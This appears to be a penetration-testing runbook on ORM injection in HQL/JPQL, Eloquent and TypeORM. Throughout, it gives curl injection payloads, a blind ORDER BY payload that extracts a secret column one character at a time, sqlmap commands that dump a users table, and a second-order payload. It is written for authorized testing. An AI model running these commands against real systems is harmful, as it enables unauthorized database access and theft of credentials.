---
title: "ORM Injection"
description: "Exploit unsafe ORM query building in HQL/JPQL and Eloquent/TypeORM raw clauses, including second-order injection."
phase: Web
order: 54
tags:
  - orm
  - injection
  - hql
  - database
tools:
  - sqlmap
  - curl
  - burp suite
updated: 2026-10-01
---

A runbook for **ORM injection** in an authorized scope. Goal: find unsafe query construction — raw fragments, string-concatenated filters, and reused stored values — then confirm injection and map impact.

## 1. Locate raw query fragments

Look for string interpolation instead of bound parameters:

- HQL/JPQL: `"from User where name = '" + input + "'"`
- Eloquent: `whereRaw("name = '$input'")`, `orderByRaw`, `selectRaw`
- TypeORM/Sequelize: `.query()`, `.where('name = ' + input)`
- Dynamic `ORDER BY` or column names

```bash
# Search the codebase if available
grep -rEn "whereRaw|orderByRaw|selectRaw|\.query\(|createQuery\(|createNativeQuery" . 2>/dev/null
grep -rEn "where\(['\"].*\+" . 2>/dev/null
```

## 2. Baseline and confirm grammar breakage

Send input that breaks the query grammar and compare behavior.

```bash
curl -s -o /dev/null -w 'base %{http_code} %{size_download}\n' 'https://target/api/search?name=test'
curl -s -o /dev/null -w 'q1   %{http_code} %{size_download}\n' "https://target/api/search?name=test'%20AND%20'1'%3D'1"
curl -s -o /dev/null -w 'q2   %{http_code} %{size_download}\n' "https://target/api/search?name=test'%20AND%20'1'%3D'2"
curl -s -o /dev/null -w 'q3   %{http_code} %{size_download}\n' "https://target/api/search?name=test'--%20-"
```

A TRUE/FALSE difference or a new error confirms a candidate.

## 3. HQL/JPQL specifics

HQL/JPQL differ from SQL: entity names replace tables and `UNION` is often unavailable. Test conditions and entity navigation instead.

```bash
curl -s 'https://target/api/search?name=x%27%20or%20name%20is%20not%20null%20or%20%27a%27%3D%27a'
curl -s 'https://target/api/search?name=x%27%20or%201%3D1--%20-'
curl -s 'https://target/api/orders?sort=id,(select+count(*)+from+User)'
```

## 4. Raw clause abuse in frameworks

Probe user-controlled columns and directions — even parameterized values are unsafe when the column name or sort direction is interpolated.

```bash
# Dynamic ORDER BY / column injection
curl -s 'https://target/api/users?sort=name,password'
curl -s 'https://target/api/users?sort=(case+when+(select+substring(secret,1,1)+from+users)='a'+then+id+else+name+end)'
# TypeORM / Eloquent raw where via JSON
curl -s 'https://target/api/search' -H 'Content-Type: application/json' --data '{"name":"x'"'"' OR 1=1-- -"}'
```

## 5. Drive with sqlmap when parameters are routable

If the endpoint looks like SQL underneath, let `sqlmap` confirm and enumerate.

```bash
sqlmap -u 'https://target/api/search?name=test' --batch --level=3 --risk=2 --dbms=mysql
sqlmap -u 'https://target/api/search?name=test' --batch --technique=BT --dbs
sqlmap -u 'https://target/api/search?name=test' --batch --technique=BT -D app -T users --dump --where='id=1'
```

## 6. Second-order injection

A value trusted when stored can be reused unsafely later. Submit a benign-looking payload, then trigger the feature that reads it.

```bash
# Store the payload
curl -s 'https://target/api/profile' -X PUT -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' --data '{"name":"x'"'"' AND 1=1-- -"}'
# Trigger a report/export/admin query that reuses it
curl -s -o /dev/null -w 'export %{http_code} %{size_download}\n' 'https://target/api/reports/export' -H 'Authorization: Bearer <token>'
```

## 7. Full pipeline (one block)

```bash
TARGET=https://target
# static search if source is available
grep -rEn "whereRaw|orderByRaw|selectRaw|\.query\(|createQuery\(|createNativeQuery" . 2>/dev/null
# baseline vs payloads
curl -s -o /dev/null -w 'base %{http_code} %{size_download}\n' "$TARGET/api/search?name=test"
curl -s -o /dev/null -w 'TRUE %{http_code} %{size_download}\n' "$TARGET/api/search?name=test'%20AND%20'1'%3D'1"
curl -s -o /dev/null -w 'FALSE %{http_code} %{size_download}\n' "$TARGET/api/search?name=test'%20AND%20'1'%3D'2"
curl -s -o /dev/null -w 'cmt  %{http_code} %{size_download}\n' "$TARGET/api/search?name=test'--%20-"
# dynamic column / ORDER BY
curl -s "$TARGET/api/users?sort=(case+when+(select+substring(secret,1,1)+from+users)='a'+then+id+else+name+end)"
# automated confirmation
sqlmap -u "$TARGET/api/search?name=test" --batch --level=3 --risk=2 --dbs
# second order: store then trigger
curl -s "$TARGET/api/profile" -X PUT -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' --data '{"name":"x'"'"' AND 1=1-- -"}'
curl -s -o /dev/null -w 'export %{http_code} %{size_download}\n' "$TARGET/api/reports/export" -H 'Authorization: Bearer <token>'
```

## Ethics & legality

- Only test applications in an official scope or with written authorization.
- Avoid destructive statements; prove impact without altering or deleting data.
- Document the unsafe query path and confirm with minimal evidence.
